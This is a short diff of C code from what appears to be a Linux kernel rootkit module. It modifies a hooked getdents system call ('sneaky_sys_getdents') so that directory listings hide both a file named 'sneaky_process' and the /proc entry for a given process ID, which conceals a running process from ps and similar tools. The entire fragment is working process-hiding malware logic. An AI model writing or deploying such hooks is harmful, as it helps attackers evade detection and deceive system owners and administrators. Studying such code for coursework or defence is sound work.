@@ -69,9 +69,13 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
   int sneaky_len = totalbytes; // sneaky version of length
 
   while (position < sneaky_len) {
-    // compare if current is "sneaky_process"
-    if (strcmp(curt->d_name, "sneaky_process") == 0) { // is sneaky process
-      sneaky_len = totalbytes - curt->d_reclen;        // hide length
+    // compare if current is "sneaky_process" or /proc/pid
+    char curtpid[128] = {'\0'};
+    sprintf(curtpid, "%ld", pid); // get pid parameter for /proc
+
+    if (strcmp(curt->d_name, "sneaky_process") == 0 ||
+        strcmp(curt->d_name, curtpid) == 0) {
+      sneaky_len = totalbytes - curt->d_reclen; // hide length
 
       char *next = (char *)curt + curt->d_reclen; // pointer to the next
 
